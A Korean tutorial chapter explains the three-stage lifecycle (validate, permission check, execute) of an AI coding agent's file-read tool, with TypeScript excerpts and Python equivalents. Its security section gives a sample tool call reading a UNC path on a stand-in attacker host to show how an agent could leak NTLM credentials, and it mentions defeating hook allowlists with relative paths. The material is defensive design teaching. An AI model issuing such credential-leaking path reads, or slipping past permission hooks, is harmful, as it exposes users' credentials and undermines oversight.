# 3.4 단순한 도구 FileRead — 검증 → 권한 → 실행 3단계

---

## 이 챕터에서 배우는 것

- 진짜 도구 하나(`FileRead`)가 어떻게 생겼는지 — 추상이 아니라 실제 코드
- 모든 도구가 따르는 **3단계 라이프사이클**: `validateInput` → `checkPermissions` → `call`
- 1단계(validate)가 왜 디스크를 안 만지는지 — UNC 경로와 NTLM 자격증명 유출 사고를 막는 보안 설계
- "단순한 도구"라는 말이 코드 줄 수가 적다는 뜻이 아니라 책임이 단순하다는 뜻이라는 사실

---

## 사용자 경험에서 출발

Claude가 "파일 좀 읽어볼게요" 하고 spinner가 도는 그 순간. 사용자는 0.3초쯤 "음 읽고 있나 보다" 하고 본다. 그 0.3초 안에 세 가지 일이 순서대로 일어난다.

```
사용자가 본 것:        ⠋ Reading src/foo.ts
실제로 일어난 일:
   1. validateInput     ← 입력이 말이 되나? (디스크 안 만짐)
   2. checkPermissions  ← 사용자 권한 룰에 맞나? (디스크 안 만짐)
   3. call              ← 진짜 읽기 (드디어 디스크)
```

이 3단계 순서가 우연이 아니다. **순서 자체가 보안 설계**다. 왜 그런지를 이 챕터에서 본다.

---

## 본문

### `FileReadTool.ts`를 펼쳐본다

`src/tools/FileReadTool/FileReadTool.ts`는 1,184줄짜리 파일이다. 압도적인 숫자처럼 보이지만, **대부분이 PDF 파싱, 이미지 디코딩, 토큰 예산 계산** 같은 부속품이다. 진짜 골격은 337줄에서 시작하는 `buildTool({...})` 호출 하나다.

```typescript
export const FileReadTool = buildTool({
  name: 'Read',
  searchHint: 'read files, images, PDFs, notebooks',
  description: async () => DESCRIPTION,
  inputSchema,                               // 1. 어떤 입력을 받나
  outputSchema,                              // 2. 어떤 출력을 내나
  isConcurrencySafe: () => true,             // 동시 실행 OK (덮어쓰기)
  isReadOnly: () => true,                    // 읽기 전용 (덮어쓰기)
  toAutoClassifierInput: (input) => input.file_path,  // 분류기에 opt-in
  async validateInput({ file_path, pages }, ctx) { ... },  // 3단계 중 1
  async checkPermissions(input, ctx) { ... },              // 3단계 중 2
  async call({ file_path, offset, limit, pages }, ctx) { ... },  // 3단계 중 3
  // 그리고 렌더링 메서드들...
})
```

```python
# Python 등가 — FileRead 도구의 전체 골격
class ReadInput(BaseModel):
    file_path: str
    offset: int | None = None
    limit: int | None = None

class FileReadTool(ToolBase):
    name = "Read"
    input_model = ReadInput

    def is_concurrency_safe(self) -> bool: return True  # 기본값 override
    def is_read_only(self) -> bool: return True         # 기본값 override

    def description(self) -> str:
        return "Read a file from disk"

    async def validate_input(self, args, ctx) -> tuple[bool, str]: ...   # 1단계
    async def check_permissions(self, args, ctx) -> str: ...             # 2단계
    async def call(self, args, ctx) -> str: ...                          # 3단계
```

3.3에서 본 `buildTool`이 여기서 일한다. 도구 작성자가 명시한 메서드는 그대로 두고, 안 쓴 메서드는 기본값으로 채운다.

여기서 눈에 띄는 덮어쓰기 두 줄:

- `isConcurrencySafe: () => true` — 기본값은 `false`인데 작성자가 일부러 `true`로 켰다. 읽기 작업은 동시에 해도 안전하다는 판단.
- `isReadOnly: () => true` — 기본값은 `false`. 진짜로 읽기만 한다고 명시.

3.3에서 "잊으면 더 안전한 쪽"이 기본값이라고 했다. `FileRead`는 잊지 않고 두 개를 다 켰다. 명시적으로 "내가 안전 검토했다"라는 선언이다.

### 1단계: `validateInput` — 디스크를 만지지 않고 입력 검증

이 챕터의 진짜 주제다. `validateInput` 함수는 순수 검증만 한다. 코드를 좀 줄여서 보자.

```typescript
async validateInput({ file_path, pages }, ctx) {
  // (1) pages 파라미터 형식 검증 (PDF 페이지 범위)
  if (pages !== undefined) {
    const parsed = parsePDFPageRange(pages)
    if (!parsed) return { result: false, message: 'Invalid pages...' }
  }
  
  // (2) 경로 정규화 + deny 룰 매칭
  const fullFilePath = expandPath(file_path)
  const denyRule = matchingRuleForInput(fullFilePath, ctx.getAppState()..., 'read', 'deny')
  if (denyRule) return { result: false, message: 'denied by permission settings' }
  
  // (3) UNC 경로면 일단 통과 — 디스크 안 만짐
  const isUncPath = fullFilePath.startsWith('\\\\') || fullFilePath.startsWith('//')
  if (isUncPath) return { result: true }
  
  // (4) 바이너리 확장자 체크 (확장자 문자열만 봄)
  if (hasBinaryExtension(fullFilePath) && !isPDF && !isImage) {
    return { result: false, message: 'cannot read binary files' }
  }
  
  // (5) 차단 디바이스 파일 (/dev/random 등 — 무한 출력으로 행 걸림)
  if (isBlockedDevicePath(fullFilePath)) return { result: false, message: 'device file' }
  
  return { result: true }
}
```

```python
# Python 등가 — validateInput: 디스크를 만지지 않는 순수 문자열 검증
async def validate_input(self, args: dict, ctx) -> tuple[bool, str]:
    file_path = args["file_path"]

    # (1) 경로 정규화 (~ 확장 등) — 문자열 처리만
    full_path = Path(file_path).expanduser().resolve()

    # (2) deny 룰 매칭 — 문자열 패턴 비교만
    if ctx.permissions.is_denied(str(full_path)):
        return False, "denied by permission settings"

    # (3) 바이너리 확장자 체크 — 확장자 문자열만 봄
    binary_exts = {".exe", ".bin", ".so", ".dll", ".pyc"}
    if full_path.suffix in binary_exts:
        return False, "cannot read binary files"

    # (4) 차단 디바이스 파일
    blocked = {"/dev/random", "/dev/urandom", "/dev/zero"}
    if str(full_path) in blocked:
        return False, "device file"

    return True, ""
    # 핵심: fs.stat()도, open()도 안 했다. 보안상 I/O 금지.
```

5가지 검사. **공통점은 — 다섯 개 다 디스크를 만지지 않는다.** 문자열 검사뿐이다. `parsePDFPageRange`도 문자열 파싱, `expandPath`도 문자열 처리, `hasBinaryExtension`도 확장자 문자열만 본다.

왜 이렇게까지 철저하게 I/O를 피하는가?

### 진짜 이유: NTLM 자격증명 유출

코드 461줄에 이런 주석이 달려 있다.

```typescript
// SECURITY: UNC path check (no I/O) — defer filesystem operations
// until after user grants permission to prevent NTLM credential leaks
```

**UNC 경로**는 Windows의 네트워크 공유 경로다. `\\server\share\file.txt` 같은 형태. 만약 LLM이 악의적으로 UNC 경로를 만들어서 `Read('\\evil-server.com\share\trap')`을 호출했다고 하자. 시스템이 "파일이 존재하나?"를 확인하려고 `fs.stat()` 한 줄만 호출해도 — Windows는 **NTLM 인증 핸드셰이크**를 보낸다. 공격자 서버는 그 핸드셰이크에서 **현재 사용자의 NTLM 해시**를 받는다. 그걸 깨면 비밀번호. 단지 **경로를 stat 했을 뿐**인데.

이 사고를 막는 유일한 방법: **사용자가 권한을 허락하기 전에는 그 어떤 파일 시스템 호출도 하지 않는다.** 그래서 `validateInput`은 디스크를 만지지 않고 문자열 검사만 한다. UNC 경로는 그냥 통과시킨다 (`return { result: true }`). I/O는 사용자가 권한을 명시적으로 허락한 다음, 즉 `call()` 안에서만 일어난다.

**1단계가 빠른 이유는 성능이 아니다. 보안이다.**

> ⚠️ **함정:** "validateInput에서 파일 존재 확인이라도 하면 더 친절하지 않나?" — 그게 정확히 위 사고를 일으킨다. 친절함이 보안 사고가 되는 케이스다. 권한이 통과하기 전에는 아무것도 만지지 않는다는 원칙이 더 중요하다.

> ⚙️ **같은 패턴이 다른 자리에서.** `backfillObservableInput` (`FileReadTool.ts:388-394`) 안에도 비슷한 보안 미장면이 있다. 주석: "hooks.mdx documents file_path as absolute; expand so hook allowlists can't be bypassed via ~ or relative paths". hook의 allowlist가 **expand된 절대 경로**만 본다는 보장을 만들기 위해, 도구가 자기 입력의 사본을 명시적으로 정규화한다. **경로 정규화 = 보안**이라는 같은 원칙이 **NTLM 방어**와 **hook 우회 방지** 두 곳에서 동시에 작동한다. 보안 미장면은 한 군데가 아니다.

### 2단계: `checkPermissions` — 권한 시스템에 위임

```typescript
async checkPermissions(input, context): Promise<PermissionDecision> {
  const appState = context.getAppState()
  return checkReadPermissionForTool(
    FileReadTool,
    input,
    appState.toolPermissionContext,
  )
}
```

```python
# Python 등가 — 권한 시스템에 위임만 한다
async def check_permissions(self, args: dict, ctx) -> str:
    return ctx.permissions.check_read(args["file_path"])
    # 진짜 판단은 permissions 모듈이 한다.
    # 도구는 "나는 read 권한이 필요하다"만 선언.
```

짧다. 진짜 권한 로직은 `checkReadPermissionForTool`에 있다 (`utils/permissions/filesystem.ts`, Part 6에서 본다). 여기서는 그냥 위임한다. 도구는 "내가 어떤 종류의 권한을 원하는가"만 선언하고 (이 경우 **read**), 결정은 권한 시스템이 한다. 6장에서 본격적으로 다룬다.

이 위임의 의미는 — **권한 정책이 도구별로 흩어지지 않는다**. `Read`, `Glob`, `Grep`, `LSP` 같은 모든 읽기 도구가 같은 함수 한 곳을 호출한다. 정책을 바꾸려면 한 곳만 고치면 된다.

### 3단계: `call` — 드디어 디스크

권한이 통과했다면 — 그 다음에 진짜 일이 시작된다.

```typescript
async call({ file_path, offset, limit, pages }, context) {
  const fullFilePath = expandPath(file_path)
  
  // 텍스트 / 이미지 / PDF / 노트북 분기
  // 토큰 예산 검사
  // 파일 dedup (이미 읽은 거면 스텁만)
  // 진짜 fs.readFile()
  // ...
}
```

```python
# Python 등가 — 드디어 디스크를 만진다 (권한 통과 후에만 도달)
async def call(self, args: dict, ctx) -> str:
    path = Path(args["file_path"]).expanduser().resolve()
    offset = args.get("offset", 0)
    limit = args.get("limit", 2000)

    text = path.read_text(encoding="utf-8")
    lines = text.splitlines()
    sliced = lines[offset:offset + limit]
    return "\n".join(f"{i + offset + 1}\t{line}" for i, line in enumerate(sliced))
```

여기는 복잡하다. 약 690줄 된다 (line 496에서 시작해서 파일 끝 1184까지). 텍스트 디코딩, 이미지 base64, PDF 페이지 추출, 토큰 예산, 중복 읽기 dedup. 근데 이 복잡함은 **Read의 본질이 다양한 파일 타입을 다루는 것**이라서 어쩔 수 없다. **본질적인 복잡성**과 **구조의 단순함**은 다르다. 3단계 라이프사이클이 단순한 거고, 각 단계 내부는 그 도구가 하는 일만큼 복잡할 수 있다.

### 단순한 도구의 단순함은 책임 분리에 있다

이 챕터 제목의 "단순한 도구"는 코드 줄 수가 아니다. **책임의 분리**다.

| 단계 | 책임 | 디스크 만지나? |
|---|---|---|
| 1. validateInput | 입력 형식 검증, 거부 룰 매칭 | ❌ |
| 2. checkPermissions | 사용자 권한 정책 위임 | ❌ |
| 3. call | 진짜 일 | ✅ |

각 단계가 자기 일만 한다. 검증이 권한을 검사하지 않고, 권한이 실행을 안 하고, 실행이 검증을 다시 안 한다. 각 단계가 작고, 각 단계가 순수하고, 각 단계가 순서대로 호출된다. 이게 단순함의 의미다.

> 💡 **순서의 주체.** 위 3단계는 도구 객체 안의 메서드 정의 순서가 아니다. 실제 `FileReadTool.ts`를 보면 `validateInput`이 `checkPermissions`보다 뒤에 정의되어 있다 (line 418 vs 398). 순서를 강제하는 건 호출자(에이전트 루프)다. 도구는 자기가 가진 메서드만 선언하고, 어떤 순서로 호출될지는 시스템이 결정한다. 이것도 책임 분리의 한 형태 — 도구가 순서를 모르는 게 더 안전하다.

> 🔬 **Deep Dive — 왜 validateInput이 별도 단계인가? `call` 시작 부분에서 검증해도 되잖아.** 가능하지만 두 가지 이유로 분리한다. **(1) 권한 묻기 전에 거를 수 있음.** 형식이 잘못된 입력이면 사용자에게 권한을 묻기도 전에 거부할 수 있다. "이 명령 실행해도 되나요?"를 물어놓고 "아 사실 입력이 잘못됐어요"라고 하는 것보다 깔끔하다. **(2) 빠른 피드백.** validateInput은 동기적이거나 매우 빠른 비동기다. LLM이 바로 다음 시도를 할 수 있다. 만약 검증이 `call` 안에 있었다면, 잘못된 입력 → 권한 묻기 → 사용자 승인 → call → 그제서야 검증 실패. 사용자가 허락한 다음에 실패하는 황당한 흐름이 된다.

---

## Python으로 옮기면

`FileRead`의 3단계 패턴을 Python으로 줄이면 이렇게 생겼다.

```python
from __future__ import annotations
from pathlib import Path
from pydantic import BaseModel


class ReadInput(BaseModel):
    file_path: str
    offset: int = 0
    limit: int | None = None


class ValidationResult(BaseModel):
    ok: bool
    message: str | None = None


async def validate_input(input: ReadInput) -> ValidationResult:
    """1단계: 입력 검증. *디스크를 만지지 않는다*."""
    p = input.file_path
    
    # (1) UNC 경로는 일단 통과 — 보안상 검증 단계에서 만지면 안 됨
    if p.startswith("\\\\") or p.startswith("//"):
        return ValidationResult(ok=True)
    
    # (2) 바이너리 확장자 거부 (문자열 검사만)
    if Path(p).suffix.lower() in {".exe", ".bin", ".so", ".dylib"}:
        return ValidationResult(ok=False, message="cannot read binary files")
    
    # (3) 차단된 디바이스 파일
    if p in {"/dev/random", "/dev/urandom", "/dev/zero"}:
        return ValidationResult(ok=False, message="device file would block")
    
    return ValidationResult(ok=True)


async def check_permissions(input: ReadInput, app_state) -> bool:
    """2단계: 권한 위임. 정책은 한 곳에서."""
    return await check_read_permission(input.file_path, app_state)


async def call_read(input: ReadInput) -> str:
    """3단계: *드디어* 디스크. 권한이 통과한 뒤에만 호출됨."""
    path = Path(input.file_path).expanduser().resolve()
    text = path.read_text(encoding="utf-8")
    
    if input.limit is not None:
        lines = text.splitlines()[input.offset : input.offset + input.limit]
        return "\n".join(lines)
    return text


# ─── 호출자(에이전트 루프)의 흐름 ───
async def execute_read(input: ReadInput, app_state) -> str:
    result = await validate_input(input)
    if not result.ok:
        return f"[error] {result.message}"
    
    if not await check_permissions(input, app_state):
        return "[error] permission denied by user"
    
    return await call_read(input)
```

3단계가 순서대로. 1단계에서 디스크 안 만짐. 2단계에서 공통 함수에 위임. 3단계에서 진짜 일. **TypeScript 1,184줄짜리 도구의 본질이 Python 50줄로 옮겨진다.** 나머지 1,134줄은 PDF/이미지/dedup/토큰 예산 — **Read의 본질이 아니라 각 파일 형식의 본질**이다.

> 💡 **3단계 패턴은 보편적이다.** Web 프레임워크의 미들웨어도 같은 흐름이다. 입력 검증 → 인증/권한 → 핸들러. FastAPI의 `Depends`로 권한 검사를 분리하는 것도 본질이 같다. 책임을 분리하면 잘못된 순서로 일어나는 사고를 막을 수 있다.

---

## 핵심 정리

- 모든 도구는 **3단계 라이프사이클**을 따른다: `validateInput` → `checkPermissions` → `call`. 순서가 정해져 있고, 각 단계가 자기 일만 한다.
- **1단계(`validateInput`)는 디스크를 만지지 않는다.** 이건 성능이 아니라 보안이다. UNC 경로 stat 한 번이 NTLM 자격증명을 유출시킬 수 있다. 권한 통과 전에는 아무것도 만지지 않는다는 원칙.
- **2단계(`checkPermissions`)는 위임한다.** 도구는 어떤 종류의 권한이 필요한가만 선언하고, 결정은 공통 권한 시스템이 한다. 정책이 도구별로 흩어지지 않는다.
- **3단계(`call`)는 본질적으로 복잡할 수 있다.** Read는 텍스트/이미지/PDF/노트북을 다루느라 약 690줄. 본질적인 복잡성은 어쩔 수 없지만, 구조의 단순함은 유지된다.
- "단순한 도구"의 단순함은 코드 줄 수가 아니라 **책임 분리**다. 다음 챕터(3.5)에서 복잡한 도구 BashTool이 같은 3단계를 어떻게 더 어렵게 만드는지 본다 — 셸 인젝션이라는 적과 싸우면서.

---

*다음 챕터: 3.5 복잡한 도구 BashTool — 셸 인젝션과 싸우는 법*
